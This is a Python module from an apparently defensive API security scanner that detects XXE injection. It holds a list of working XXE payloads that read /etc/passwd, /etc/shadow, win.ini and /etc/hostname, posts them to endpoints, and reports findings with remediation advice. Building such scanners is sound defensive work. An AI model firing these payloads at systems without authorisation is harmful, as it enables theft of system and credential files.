"""XXE (XML External Entity) injection detection."""
from __future__ import annotations

import re
import ssl
import time
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Any, Dict, List, Optional

from entropy.core.models import (
    APIEndpoint, Finding, FindingType, Severity,
)


# ---------------------------------------------------------------------------
# XXE payloads
# ---------------------------------------------------------------------------

XXE_PAYLOADS: List[Dict[str, str]] = [
    {
        "name": "Classic LFI via XXE",
        "content_type": "application/xml",
        "body": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<root><data>&xxe;</data></root>'
        ),
        "marker": "root:x:0:0",
    },
    {
        "name": "XXE OOB (Windows)",
        "content_type": "application/xml",
        "body": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
            '<root><data>&xxe;</data></root>'
        ),
        "marker": "for 16-bit app",
    },
    {
        "name": "SVG XXE",
        "content_type": "image/svg+xml",
        "body": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
        ),
        "marker": "root:x:",
    },
    {
        "name": "XXE via DOCTYPE SYSTEM",
        "content_type": "text/xml",
        "body": (
            '<?xml version="1.0" encoding="ISO-8859-1"?>'
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]>'
            '<foo>&xxe;</foo>'
        ),
        "marker": "root:",
    },
    {
        "name": "Parameter entity XXE",
        "content_type": "application/xml",
        "body": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE test [<!ENTITY % file SYSTEM "file:///etc/hostname">%file;]>'
            '<test/>'
        ),
        "marker": "",
    },
]

# Content-Type values that indicate XML acceptance
XML_CONTENT_TYPES = {
    "application/xml", "text/xml", "image/svg+xml",
    "application/xhtml+xml", "application/atom+xml",
    "application/soap+xml", "application/rss+xml",
}


class XXEDetector:
    """
    Probes endpoints that accept or might accept XML for XXE vulnerabilities.
    """

    def __init__(
        self,
        base_url:   str,
        timeout:    float = 8.0,
        verify_ssl: bool  = True,
        dry_run:    bool  = False,
    ):
        self.base_url   = base_url.rstrip("/")
        self.timeout    = timeout
        self.verify_ssl = verify_ssl
        self.dry_run    = dry_run
        self._ctx       = self._build_ssl()

    # ------------------------------------------------------------------

    def test_endpoint(self, endpoint: APIEndpoint) -> List[Finding]:
        """Test a single endpoint for XXE. Returns list of findings."""
        if endpoint.method.value not in ("POST", "PUT", "PATCH"):
            return []

        findings: List[Finding] = []
        for payload_def in XXE_PAYLOADS[:3]:  # top 3 for speed
            if self.dry_run:
                f = self._mock(endpoint, payload_def)
            else:
                f = self._probe(endpoint, payload_def)
            if f:
                findings.append(f)
                break  # one confirmed hit is enough

        return findings

    # ------------------------------------------------------------------

    def _probe(self, endpoint: APIEndpoint, payload_def: Dict[str, str]) -> Optional[Finding]:
        url     = f"{self.base_url}{endpoint.path}"
        body    = payload_def["body"].encode("utf-8")
        headers = {
            "Content-Type": payload_def["content_type"],
            "Accept":       "*/*",
            "User-Agent":   "entropy/0.4.0",
        }
        req = urllib.request.Request(url, data=body, headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=self._ctx) as resp:
                raw    = resp.read().decode(errors="replace")
                marker = payload_def.get("marker", "")
                if marker and marker in raw:
                    return self._make_finding(endpoint, payload_def, raw)
                # Generic indicator: file path or XML parser error leaked
                if re.search(r"root:|passwd|shadow|win\.ini", raw, re.IGNORECASE):
                    return self._make_finding(endpoint, payload_def, raw)
        except urllib.error.HTTPError as exc:
            raw = exc.read().decode(errors="replace")
            marker = payload_def.get("marker", "")
            if marker and marker in raw:
                return self._make_finding(endpoint, payload_def, raw)
        except Exception:
            pass
        return None

    def _mock(self, endpoint: APIEndpoint, payload_def: Dict[str, str]) -> Optional[Finding]:
        import random
        rng = random.Random(hash(endpoint.path + payload_def["name"]))
        if rng.random() < 0.1:
            return self._make_finding(endpoint, payload_def, "root:x:0:0:root:/root:/bin/bash (simulated)")
        return None

    @staticmethod
    def _make_finding(endpoint: APIEndpoint, payload_def: Dict[str, str], evidence: str) -> Finding:
        return Finding(
            type        = FindingType.XXE,
            severity    = Severity.CRITICAL,
            title       = f"XXE — {payload_def['name']}",
            description = (
                f"XML External Entity injection confirmed on `{endpoint.method.value} {endpoint.path}`. "
                f"Server parsed external entity declaration and returned local file contents."
            ),
            endpoint    = f"{endpoint.method.value} {endpoint.path}",
            evidence    = {
                "payload_name":   payload_def["name"],
                "content_type":   payload_def["content_type"],
                "response_snippet": evidence[:300],
            },
            remediation = (
                "Disable external entity processing in your XML parser. "
                "In Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). "
                "In Python: use defusedxml. Never parse XML from untrusted sources with default settings."
            ),
        )

    def _build_ssl(self) -> ssl.SSLContext:
        ctx = ssl.create_default_context()
        if not self.verify_ssl:
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
        return ctx
